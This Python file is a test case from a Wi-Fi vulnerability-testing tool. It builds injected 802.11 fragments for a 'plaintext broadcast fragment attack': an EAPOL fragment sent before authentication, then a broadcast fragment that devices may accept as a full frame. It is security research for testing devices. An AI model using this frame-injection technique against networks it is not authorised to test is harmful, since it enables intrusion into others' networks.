# Copyright (c) 2020, Mathy Vanhoef <mathy.vanhoef@nyu.edu>
#
# This code may be distributed under the terms of the BSD license.
# See README for more details.

from fraginternals import *

class BcastEapFragTest(Test):
	"""
	This was an early version of the plaintext broadcast fragment attack.
	See docs/macoxs-reversing.md for background on this attack. It turns
	out that the attack is in fact simplier than I thought, and works more
	devices than just MacOS, meaning this test case is no longer relevant.
	"""
	def __init__(self, ptype, actions, bcast_dst):
		super().__init__(actions)
		self.ptype = ptype
		self.bcast_dst = bcast_dst

		actions = self.get_actions(Action.Inject)
		if len(actions) != 2:
			log(ERROR, f"eapfrag: invalid arguments, should give 2 inject action (gave {len(actions)}).")
			quit(1)
		elif actions[0].encrypted:
			log(ERROR, f"eapfrag: first inject action should not be encrypted.")
			quit(1)

	def prepare(self, station):
		# First fragment is the start of an EAPOL frame
		header = station.get_header(prior=2)
		request = LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A"*32)
		frag1, _ = create_fragments(header, data=request, num_frags=2)

		# Second fragment has same sequence number. Will be accepted
		# before authenticated because previous fragment was EAPOL.
		# By sending to broadcast, this fragment will not be reassembled
		# though, meaning it will be treated as a full frame (and not EAPOL).
		_, request, check_fn = generate_request(station, self.ptype)
		frag2, = create_fragments(header, data=request, num_frags=1)
		frag2.SC |= 1
		frag2.addr1 = "ff:ff:ff:ff:ff:ff"

		# We can automatically detect result if the last fragment was
		# sent after the authentication
		if self.actions[-1].trigger >= Action.AfterAuth:
			self.check_fn = check_fn

		# Practically all APs will not process frames with a broadcast receiver address, unless
		# they are operating in client mode. But to test APs without tcpdump anyway, allow the
		# ping to be send to a broadcast destination, so other STAs can monitor for it.
		if self.bcast_dst and frag2.FCfield & Dot11(FCfield="to-DS").FCfield != 0:
			frag2.addr3 = "ff:ff:ff:ff:ff:ff"

		actions = self.get_actions(Action.Inject)
		actions[0].frame = frag1
		actions[1].frame = frag2
